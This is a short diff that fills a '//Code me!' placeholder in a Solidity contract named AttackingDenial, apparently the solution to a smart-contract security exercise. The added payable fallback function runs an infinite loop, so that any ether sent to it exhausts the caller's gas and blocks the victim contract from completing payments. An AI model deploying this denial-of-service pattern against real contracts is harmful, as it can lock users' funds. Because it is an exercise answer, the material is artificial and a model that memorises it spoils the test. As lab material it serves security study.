@@ -9,5 +9,8 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    fallback() external payable {
+        // solhint-disable-next-line no-empty-blocks
+        while (true) {}
+    }
 }
